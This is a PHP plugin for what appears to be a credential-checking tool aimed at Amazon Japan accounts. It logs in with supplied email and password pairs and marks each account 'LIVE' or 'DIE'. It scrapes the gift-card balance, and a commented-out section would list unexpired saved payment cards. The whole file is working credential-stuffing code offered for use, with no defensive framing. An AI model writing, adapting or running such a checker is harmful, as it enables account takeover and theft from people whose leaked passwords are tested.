<?php
class check_amazonjp extends plugins {
	public $meta = array(
		'id' 	=> "amazonjp",
		'name' => "Check amazon japan",
		'version' => "1.0.0",
		'descrition' =>"Check amazon japan acc, points"
	);

	public $fields = array(
		"status" => "str",
		#"cards" => "str",
		"point" => "int",
	);

	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass,isset($request['cards']),isset($request['point']));
	}

	private function runCheck($m,$p,$check_card=false,$check_point=false) {
		$session = new Session();
		$return = array();

		$ref = "https://www.amazon.co.jp/";

		$html = $session->connect($ref);
		if (!preg_match('/[\\\'\"](\/gp\/navigation\/redirector\.html\/ref\=sign\-in\-redirect.+?)[\\\'\"]/i',$html,$match)) {
			$return['status'] = "ERROR";
			return $return;
		}

		$url = "https://www.amazon.co.jp" . $match[1];

		$html = $session->connect($url,$ref);
		$data = $session->get_field($html,"signIn");

		$data["create"] = 0;
		$data["email"] = $m;
		$data["password"] = $p;

		$html = $session->connect("https://www.amazon.co.jp/ap/signin",$url,$data);

		if (strpos($html, 'Location: https://www.amazon.co.jp?ie=UTF8&ref_=nav_ya_signin&') === false) {
			$return['status'] = "DIE";
			return $return;
		}

		if ($check_point) {
			$html = $session->connect("https://www.amazon.co.jp/gp/css/gc/balance?ie=UTF8&ref_=ya_view_gc","https://www.amazon.co.jp/");
			$html = mb_convert_encoding($html, "UTF-8", "Shift_JIS");
			if (preg_match('/<span>￥ ([0-9]+)<\/span/i',$html,$match)) {
				$return['point'] = str_replace(",","",$match[1]);
			} else {
				$return['point'] = -1;
			}
		}

		// if ($check_card) {
		// 	$html = $session->connect("https://www.amazon.co.jp/gp/css/account/cards/view.html?ie=UTF8&ref_=ya_cc","https://www.amazon.co.jp/");
		// 	$html = mb_convert_encoding($html, "UTF-8", "Shift_JIS");
		// 	$r = array();
		// 	$mon = intval(date('n'));
		// 	$y = intval(date('Y'));
		// 	if (preg_match_all('/有効期限\：<\/b><\/td><td>(([0-9][0-9])\/(20[0-9][0-9]))<\/td>/i',$html,$match,PREG_SET_ORDER)) {
		// 		foreach ($match as $m) {
		// 			if ($m[3]>$y||($m[3]==$y&&$m[2]>=$mon)) $r[] = $m[1];
		// 		}
		// 	}

		// 	$return['cards'] = implode(",",$r);
		// }

		$return['status'] = "LIVE";
		return $return;
	}

}
?>
